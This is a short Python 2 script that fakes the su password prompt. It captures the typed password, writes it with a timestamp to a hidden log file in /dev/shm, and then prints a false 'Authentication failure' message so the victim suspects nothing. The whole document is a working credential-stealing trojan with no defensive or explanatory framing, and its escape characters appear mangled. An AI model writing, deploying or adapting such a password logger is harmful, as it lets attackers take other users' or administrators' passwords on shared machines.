#!/usr/bin/python

import os,sys,getpass,time

current_time = time.strftime("%Y-%m-%d %H:%M")
log_file = "/dev/shm/.su.log"

faile_str = "su: Authentication failure"

try:
    passwd = getpass.getpass(prompt='Password: ')
    file = open(log_file, 'a')
    file.write("[%s]t%s"%(passwd, current_time))
    file.write("n")
    file.close()
except:
    pass
time.sleep(1)
print faile_str
